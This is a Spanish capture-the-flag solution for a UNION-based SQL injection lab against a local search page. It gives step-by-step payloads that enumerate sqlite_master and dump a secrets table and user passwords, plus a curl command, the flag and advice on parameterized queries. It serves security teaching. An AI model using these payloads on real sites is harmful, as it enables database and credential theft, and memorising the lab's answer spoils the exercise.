# Solución — Reto 10 (Inyección SQL con UNION)

## Idea clave

El buscador ejecuta algo como:

```sql
SELECT nombre, precio, descripcion FROM productos WHERE nombre LIKE '%LO_QUE_ESCRIBAS%'
```

Como tu texto se inyecta igual que en el reto 09, puedes cerrar la cadena y
añadir un `UNION SELECT` que lea **otra tabla**. Los resultados de ambas
consultas aparecen en la misma tabla HTML. El único requisito de `UNION` es
que las dos consultas tengan **el mismo número de columnas**.

Todo lo que escribas va en el campo "Buscar producto". En una URL, los
espacios se pueden escribir como `%20` o `+`; en el navegador, escríbelos tal
cual.

## Paso a paso

1. **Confirma la inyección.** Busca `'` → salta un `Error de base de datos`.

2. **Cuenta las columnas.** Prueba a desequilibrar el número:
   ```
   ' UNION SELECT 1,2 --
   ```
   → error (`SELECTs ... have different number of result columns`). Ahora:
   ```
   ' UNION SELECT 1,2,3 --
   ```
   → funciona, y aparece una fila con `1 | 2 | 3`. Son **3 columnas**
   (coincide con las tres de la tabla).

3. **Lista las tablas** con el catálogo interno de SQLite:
   ```
   ' UNION SELECT name, type, sql FROM sqlite_master --
   ```
   En la tabla verás, además de `productos`, las tablas `usuarios` y
   **`boveda`**, con su definición: `boveda(id, secreto)`.

4. **Lee la bóveda.** Tiene las columnas `id` y `secreto` (2), pero tú
   necesitas 3 para el `UNION`. Rellena la que falta con una constante:
   ```
   ' UNION SELECT secreto, id, 'x' FROM boveda --
   ```
   La tabla muestra, en la columna "Nombre", las filas de la bóveda:
   ```
   La combinación de la caja fuerte es 04-19-77
   CENTINELA{union_select_abre_la_boveda}
   ```

   Desde la terminal:
   ```bash
   curl -s -G http://127.0.0.1:5000/productos \
     --data-urlencode "q=' UNION SELECT secreto, id, 'x' FROM boveda -- " | grep CENTINELA
   ```

   > Bonus: también puedes volcar `usuarios` con
   > `' UNION SELECT username, password, rol FROM usuarios -- ` y recuperar la
   > contraseña real de admin que te faltaba en el reto 09.

## Flag

```
CENTINELA{union_select_abre_la_boveda}
```

## Lección

- `UNION SELECT` convierte un simple buscador en una ventana a **toda** la base
  de datos: otras tablas, usuarios, secretos. Por eso una SQLi casi nunca es
  "poca cosa".
- El arreglo es el mismo del reto 09: **consultas parametrizadas**. Para el
  `LIKE`, el patrón también viaja como parámetro:
  ```python
  db.execute("SELECT nombre, precio, descripcion FROM productos WHERE nombre LIKE ?",
             ("%" + q + "%",))
  ```
- Defensa en profundidad: la cuenta que usa la web debería tener permisos
  mínimos (sin acceso a tablas de secretos), y los mensajes de error no
  deberían revelar detalles de la base de datos al usuario.
